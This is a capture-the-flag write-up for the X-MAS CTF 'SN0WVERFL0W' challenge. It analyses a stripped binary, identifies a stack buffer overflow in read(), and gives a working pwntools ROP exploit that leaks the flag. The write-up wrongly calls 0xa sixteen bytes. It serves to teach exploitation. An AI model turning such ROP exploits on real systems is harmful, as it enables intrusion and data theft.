# SN0WVERFL0W
> Binary Exploitation
--------------------

## Problem Statement
> Snow, snow, snow... there is snow everywhere! I'm feeling a little bit overwhelmed... or would I say overflowed?  
> **Connect using: nc challs.xmas.htsp.ro 12006**  
> File : [**chall**](./chall)

## Analysis

* Lets just quickly check the binary
    >```shell
    >$strings chall
    >...
    >...
    >X-MAS{REAL FLAG ON THE SERVER}
    >...
    >...
    >
    >$ file chall
    >chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
    >BuildID[sha1]=b96d5da6df4dc39b35bec7a8068b741d24999c3d, stripped
    >
    >$ checksec chall
    >[*] 'snowoverflow/chall'
    >    Arch:     amd64-64-little
    >    RELRO:    Partial RELRO
    >    Stack:    No canary found
    >    NX:       NX enabled
    >```
*  Things to note here are
    >   * **The Flag is contained within the binary**
    >   * **Stripped** `The binary is stripped (No function name is present )`
    >   * **NX enabled** `Stack is not executable (cannot place a shellcode on stack)`
    >   * **Dynamically linked**

* Let's check the disassembly  
    `But wait we the binary has no information about function names right? so
    how can we disassemble main`  
    > **Disaaembly of main**
    >```gdb
    >gdb$  x/38i 0x401167
    >    0x401167:    push   rbp
    >    0x401168:    mov    rbp,rsp
    >    0x40116b:    sub    rsp,0x10
    >    0x40116f:    mov    rax,QWORD PTR [rip+0x2eda]        # 0x404050 <stdin>
    >    0x401176:    mov    ecx,0x0
    >    0x40117b:    mov    edx,0x2
    >    0x401180:    mov    esi,0x0
    >    0x401185:    mov    rdi,rax
    >    0x401188:    call   0x401060 <setvbuf@plt>
    >    0x40118d:    mov    rax,QWORD PTR [rip+0x2eac]        # 0x404040 <stdout>
    >    0x401194:    mov    ecx,0x0
    >    0x401199:    mov    edx,0x2
    >    0x40119e:    mov    esi,0x0
    >    0x4011a3:    mov    rdi,rax
    >    0x4011a6:    call   0x401060 <setvbuf@plt>
    >    0x4011ab:    mov    edi,0x402030
    >    0x4011b0:    call   0x401030 <puts@plt>
    >    0x4011b5:    lea    rax,[rbp-0xa]
    >    0x4011b9:    mov    edx,0x64
    >    0x4011be:    mov    rsi,rax
    >    0x4011c1:    mov    edi,0x0
    >    0x4011c6:    mov    eax,0x0
    >    0x4011cb:    call   0x401040 <read@plt>
    >    0x4011d0:    lea    rax,[rbp-0xa]
    >    0x4011d4:    mov    esi,0x40205a
    >    0x4011d9:    mov    rdi,rax
    >    0x4011dc:    call   0x401050 <strcmp@plt>
    >    0x4011e1:    test   eax,eax
    >    0x4011e3:    jne    0x4011f1
    >    0x4011e5:    mov    edi,0x40205e
    >    0x4011ea:    call   0x401030 <puts@plt>
    >    0x4011ef:    jmp    0x4011fb
    >    0x4011f1:    mov    edi,0x402077
    >    0x4011f6:    call   0x401030 <puts@plt>
    >    0x4011fb:    mov    eax,0x0
    >    0x401200:    leave
    >    0x401201:    ret
    >    0x401202:    nop    WORD PTR cs:[rax+rax*1+0x0]
    >gdb$  
    >```
* Lets annalyse everything we have 
    > * Size of stack in 0x10 **16 bytes**
    >     ```
    >    0x401167:    push   rbp
    >    0x401168:    mov    rbp,rsp
    >    0x40116b:    sub    rsp,0x10
    >    ```
    > * Then there are certain calls to certain functions setvbuf, puts and read  
    >`lets checkout read because we will be directly interacting with it` 
    >
    >    ```gdb
    >    0x4011b5:    lea    rax,[rbp-0xa]
    >    0x4011b9:    mov    edx,0x64
    >    0x4011be:    mov    rsi,rax
    >    0x4011c1:    mov    edi,0x0
    >    0x4011c6:    mov    eax,0x0
    >    0x4011cb:    call   0x401040 <read@plt>
    >    ```
    > So read gets a buffer of **0xa (16) bytes** but it can write **0x64 (100)bytes**

## Solution
* Loadout  `What do we have`  

                                            We have a buffer overflow
                            Stack is not executable so we can't execute any shellcode
                                        So we have to use a ROP chain

* Target `what to do`  

                                  Read a string from a memory location within the binary

* Plan  

                                            Find The  address of String
                                                Find address of puts
                                        Call puts with the address of string

## Exploit

* Lets write all that in code

    * [**exploit.py**](./exploit.py)
        ```python
        #!/bin/env python3

        from pwn import *
        import sys

        context.arch = 'amd64'
        chall = ELF('./chall')

        if len(sys.argv) > 1 and sys.argv[1] == 'remote':
            host, port = 'challs.xmas.htsp.ro', 12006
            p = remote(host, port)
        else:
            p = chall.process()

        buff = b'A' * (0xa + 8)
        flag = p64(next(chall.search(b'X-MAS')))
        call_puts = p64(chall.symbols['puts'])
        pop_rdi = p64(next(chall.search(asm('pop rdi; ret'))))

        ROP_chain = buff + pop_rdi + flag + call_puts

        p.recvline()
        p.sendline(ROP_chain)
        p.recvline()
        print(p.recvline().decode(),end='')
        ```

## Flag
>```shell
>$ ./exploit.py remote
> X-MAS{700_much_5n0000w}
>```
>**flag:**   `X-MAS{700_much_5n0000w}` 
